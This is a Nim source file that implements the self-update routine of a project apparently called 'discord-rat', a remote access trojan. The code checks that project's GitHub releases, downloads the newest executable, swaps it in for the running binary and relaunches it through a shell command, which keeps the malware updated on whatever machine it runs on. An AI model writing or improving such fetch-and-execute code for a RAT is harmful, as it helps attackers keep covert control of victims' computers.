import httpclient
import constants
import json
import strutils
import os

proc checkForUpdates*() =
  var client = newHttpClient()

  let latestRelease = parseJson(
    client.getContent(
      "https://api.github.com/repos/vieruuuu/discord-rat/releases")
    )[0]

  let latestVersion: float = parseFloat latestRelease["tag_name"].getStr

  if VERSION < latestVersion:
    # time for update

    let latestExe: string = latestRelease["assets"][0][
        "browser_download_url"
      ].getStr

    let updateFile = getAppDir() / "update.exe"
    let oldFile = getAppDir() / "old.exe"

    client.downloadFile(latestExe, updateFile)

    moveFile(getAppFilename(), oldFile)

    moveFile(updateFile, getAppFilename())

    echo getAppFilename()

    discard execShellCmd("start /b \"\" \"" & getAppFilename() & "\"")

    quit(0)
